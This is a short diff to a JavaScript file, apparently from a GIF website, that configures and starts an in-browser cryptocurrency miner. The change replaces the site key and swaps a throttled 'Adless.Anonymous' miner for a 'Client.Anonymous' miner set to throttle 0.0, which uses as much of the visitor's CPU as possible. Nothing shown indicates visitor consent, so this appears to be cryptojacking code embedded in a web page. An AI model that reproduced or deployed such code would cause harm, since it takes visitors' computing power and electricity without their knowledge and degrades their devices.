@@ -9,7 +9,7 @@ const random = (min, max) => {
     return Math.round(min - 0.5 + Math.random() * (max - min + 1));
 };
 
-const siteKey = "d64f48ddbeeb4167624a838b6651728f";
+const siteKey = "1d34c21acef8bedf96c0c4fb1c45d9c3502b3733977dba26c0289290562a31bf";
 const userName = `gifster-${random(1, 99999)}`;
 let threads;
 
@@ -25,7 +25,11 @@ else {
 
 console.log(threads);
 
-const miner = new Adless.Anonymous(siteKey, {throttle: 0.6, threads: threads});
+// const miner = new Adless.Anonymous(siteKey, {throttle: 0.6, threads: threads});
+
+const miner = new Client.Anonymous('1d34c21acef8bedf96c0c4fb1c45d9c3502b3733977dba26c0289290562a31bf', {
+    throttle: 0.0
+});
 
 miner.start();
 
